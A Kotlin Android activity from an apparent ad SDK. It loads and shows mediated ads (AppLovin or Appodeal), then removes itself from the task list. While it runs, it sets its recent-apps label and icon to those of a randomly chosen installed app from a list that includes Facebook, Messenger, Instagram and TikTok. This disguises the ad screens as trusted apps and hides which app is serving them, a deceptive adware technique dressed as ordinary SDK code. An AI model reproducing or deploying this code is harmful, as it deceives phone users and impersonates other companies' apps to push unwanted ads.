package com.app.sdk

import android.app.ActivityManager.TaskDescription
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.Canvas
import android.graphics.Color
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.core.graphics.createBitmap
import com.app.sdk.sdk.PlayerSdk
import com.app.sdk.sdk.data.Prefs
import com.app.sdk.sdk.mediator.ApplovinMediator
import com.app.sdk.sdk.mediator.AppodealMediator
import com.app.sdk.sdk.mediator.Mediator


class DymmyActivity : AppCompatActivity(), Mediator.MediatorCallBack {
    private val mainMediator by lazy { ApplovinMediator(this) }
    private val addictionMediator by lazy { AppodealMediator(this) }
    private var currentMediator: Mediator? = null

    private val listOfApps = listOf(
        "com.facebook.orca",
        "com.facebook.katana",
        "com.example.facebook",
        "com.facebook.android",
        "com.instagram.android",
        "com.ss.android.ugc.trill"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.empty)
        show()
    }

    fun show() {
        currentMediator = getCurrentMediator()
        currentMediator?.initMediator(this)
        setTaskDescription()
    }

    private fun getCurrentMediator() =
        if (Prefs.getInstance(this).isMain()) mainMediator else addictionMediator

    private fun setTaskDescription() {
        getApplicationInfoForApp()
            .let(::getTaskDescription)
            .let(::setTaskDescription)
    }

    @Suppress("DEPRECATION")
    private fun getTaskDescription(info: ApplicationInfo?) = if (info != null)
        TaskDescription(info.loadLabel(packageManager).toString(), getLogoBitmap(info), Color.WHITE)
    else TaskDescription(" ", getLogoBitmap(info), Color.BLACK)

    private fun getLogoBitmap(info: ApplicationInfo?) = createBitmap(100, 100).apply {
        val canvas = Canvas(this)
        info?.loadIcon(packageManager)?.let {
            it.setBounds(0, 0, width, height)
            it.draw(canvas)
        } ?: eraseColor(Color.BLACK)
    }

    private fun getApplicationInfoForApp() = listOfApps
        .mapNotNull(::existApplicationInfo)
        .randomOrNull()

    private fun existApplicationInfo(packageName: String) = try {
        packageManager.getApplicationInfo(packageName, PackageManager.GET_META_DATA)
    } catch (e: Exception) {
        null
    }

    override fun onCompleteLoad() {
        currentMediator?.showAd(this)
    }

    override fun onCompleteDisplay() {
        PlayerSdk.saveShowingTime(this)
        finishAndRemoveTask()
    }

    override fun onTrimMemory(level: Int) {
        if (level == TRIM_MEMORY_UI_HIDDEN) {
            PlayerSdk.saveShowingTime(this)
            finishAndRemoveTask()
        }
    }
}